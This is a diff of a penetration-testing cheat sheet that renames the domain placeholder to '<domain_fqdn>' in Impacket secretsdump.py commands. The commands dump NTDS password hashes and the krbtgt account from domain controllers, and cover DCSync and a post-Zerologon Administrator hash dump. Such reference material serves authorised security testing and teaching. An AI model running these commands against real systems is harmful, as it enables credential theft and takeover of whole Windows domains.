@@ -41,21 +41,20 @@ secretsdump.py -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|securi
 ## NTDS - online (NTLM + keys)
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<dc_fqdn>
+secretsdump.py -just-dc -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
 ```
 
 ## NTDS - online (only NTLM)
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc-ntlm -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<dc_fqdn>
+secretsdump.py -just-dc-ntlm -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
 ```
 
 ## NTDS - online account (only NTLM)
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc-user <domain>/<name|krbtgt> '<domain>/<user>:<password>'@<dc_fqdn>
+secretsdump.py -just-dc-user <domain_fqdn>/<name|krbtgt> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
 ```
-
 
 
 ## NTDS - offline
@@ -69,11 +68,11 @@ secretsdump.py  -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save
 zerologon
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
+secretsdump.py <domain_fqdn>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
 ```
 
 ## DCSYNC - online (ptt)
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain>/<user>'@<dc_fqdn>
+secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain_fqdn>/<user>'@<dc_fqdn>
 ```
